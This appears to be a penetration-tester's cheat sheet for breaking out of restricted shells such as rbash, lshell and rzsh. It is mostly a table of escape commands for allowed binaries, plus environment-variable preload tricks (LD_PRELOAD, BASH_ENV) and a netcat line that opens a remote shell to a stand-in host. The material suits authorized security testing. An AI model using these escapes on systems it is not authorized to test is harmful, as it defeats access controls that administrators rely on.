# Restricted Shell — rbash / lshell / jailshell / rzsh

## Detection — which restricted shell is this

```
rbash / bash -r        — bash restricted mode
lshell                 — python-based whitelist
rzsh / zsh -r          — zsh restricted
cplocker               — cpanel
pdsh / rush            — limited shells
custom jail            — "command not allowed" style
```

```bash
echo $0; echo $SHELL; compgen -c | head; env; alias; set -o | grep restricted
```

## rbash — what it actually blocks

- `cd` outside restricted dirs
- `SHELL`, `PATH`, `ENV`, `BASH_ENV` modification
- `/` in command names (no `../`/`/bin/x`)
- `>` `>>` `<>` `>&` `>|` redirection
- `exec` builtin
- `set +r` — can't unset

Bypasses that still work inside rbash:

- `cd` to a restricted-dir that's still writable
- commands via PATH-lookup (`ls`/`cat` still resolve)
- glob `*`/`?`/`[]`
- functions/aliases (if preserved)
- `$( )`/backtick substitution INSIDE allowed builtins
- `printf`/`echo`/`test` builtins
- the `BASH_ENV`/`ENV` — if set BEFORE rbash
- **`sh`/`bash`/`dash`/`python`/`perl`/`ruby`/`vim`/`less`/`man`/`find`/`awk`/`tar`/`ssh`/`scp`/`ftp`/`gdb`/`env`** — any exec-capable tool

## lshell — python-based whitelist

`lshell.conf` has `allowed: ['ls','cd',...]` — only whitelisted commands
run. Bypasses:

- a whitelisted command that itself execs (`vi`/`less`/`find`/`awk`/`tar`)
- the `-c`/`--` args after a whitelisted name — `ls -la` allowed but
  `ls;id`? — lshell checks the raw line — `ls -la;id`? — the parser may
  or may not split on `;` — depends on lshell version
- `$( )`/backtick inside the allowed command — `ls $(id)` — lshell may
  not parse the substitution
- the `&&`/`||`/`|`-separators after an allowed first command —
  `ls && id` — lshell may only check the first
- `warning_counter` exhaustion — if lshell has a counter, spam it?

## The generic "the shell only allows X" escape paths

| Allowed | Escape |
|---|---|
| `vi`/`vim` | `:!id` |
| `less`/`more` | `!id` |
| `man` | `!id` |
| `find` | `find . -exec sh -c id \;` |
| `awk`/`gawk`/`mawk`/`nawk` | `awk 'BEGIN{system("id")}'` |
| `sed` | `sed -e 'id' x` / `sed 's/x/e cmd/e'` |
| `tar` | `tar --checkpoint-action=exec='id'` |
| `zip`/`unzip` | `-T --unzip-command=` |
| `ssh` | `-oProxyCommand=` / `-oLocalCommand=` |
| `git` | `-c core.pager=id diff` |
| `ftp` | `!id` at prompt |
| `gdb` | `-ex '!id'` |
| `env` | `env BASH_ENV=/tmp/x bash` |
| `perl` | `perl -e 'system("id")'` |
| `python` | `python -c 'import os;os.system("id")'` |
| `ruby` | `ruby -e 'system("id")'` |
| `php` | `php -r 'system("id");'` |
| `lua`/`tclsh`/`irb` | exec builtins |
| `busybox` | `busybox sh` / `busybox id` |
| `nc`/`netcat`/`ncat` | `nc x 80 -e sh` |
| `socat` | `socat exec:'sh'` |
| `expect` | `expect -c 'spawn sh;interact'` |
| `tee` | `echo x | tee /tmp/o` — file-write |
| `cp`/`mv` | copy a shell binary |
| `curl`/`wget` | `-o` file-write |
| `tar`/`zip`/`unzip`/`7z` | write/traverse |
| `base64`/`xxd`/`od`/`hexdump` | read/encode |
| `printf`/`echo` | write to file via `>` |
| `script` | `script -qc 'id' /dev/null` |
| `taskset`/`ionice`/`chroot` | run-command-as-arg |
| `mail`/`sendmail` | config-flag |
| `openssl` | `-engine`/`-in` |
| `watch`/`timeout` | `watch 'id'` / `timeout 1 sh` |
| `nmap` | `--script=x` |
| `nslookup`/`dig` | `!`-escape / `-f` file |
| `mysql`/`psql`/`sqlite3` | `!id`/`\. sh`/`.shell` |
| `dpkg`/`apt`/`rpm` | `!`-escape (interactive) |
| `journalctl` | `!id` in pager |
| `systemctl` | `!id` in pager |
| `screen`/`tmux` | shell-out |
| `vim`/`nano`/`emacs` | `:!`/`^X`/`M-!` |
| `python`/`perl`/`ruby`/`php`/`node`/`lua`/`tclsh` | `-e`/`-c` |
| `busybox` | subcmd |
| `ld.so`/`ld-linux` | `ld.so /bin/sh` |
| `mount`/`umount`/`unshare`/`nsenter` | ns-priv escape |
| `ip`/`ifconfig`/`route` | limited |
| `xargs`/`parallel` | `xargs -a f sh` |
| `sed`/`awk`/`ed`/`ex` | script-exec |
| `tee`/`dd`/`install`/`cp`/`mv`/`rsync` | write/read |
| `openssl`/`ssh`/`scp`/`sftp`/`curl`/`wget`/`fetch`/`aria2c`/`axel` | net/exec |
| `docker`/`podman`/`kubectl`/`nsenter`/`chroot` | container |
| `gdb`/`strace`/`ltrace`/`lldb` | `!`/`shell`/`process launch` |

## The env-var pre-loads — before the shell restricts

- `BASH_ENV=/tmp/x` — non-interactive bash runs BASH_ENV
- `ENV=/tmp/x` — POSIX sh
- `SHELLOPTS=xtrace` — bash option env
- `PROMPT_COMMAND=id` — bash prompt-hook
- `PS4='$(id)'` — xtrace prefix
- `LD_PRELOAD=/tmp/x.so` — loader preload
- `PERL5OPT='-M/tmp/x'` / `RUBYOPT='-r/tmp/x'` / `NODE_OPTIONS='--require /tmp/x'` / `PYTHONSTARTUP=/tmp/x` / `PYTHONWARNINGS='...'` — lang-env

If you can WRITE env vars before rbash starts → `env-var-injection.md`.

## The cplocker / rzsh / rush / others — same recipe

Check allowed commands → look for an exec-capable one → escape.
`GTFOBins`-style list is the menu — every exec-capable binary is an out.

## Falsifiers

- no exec-capable binary is reachable AND env/preload is locked AND
  builtins are restricted → the jail holds; look for a different class

## Output to record

- which jail + which allowed-binary escape worked
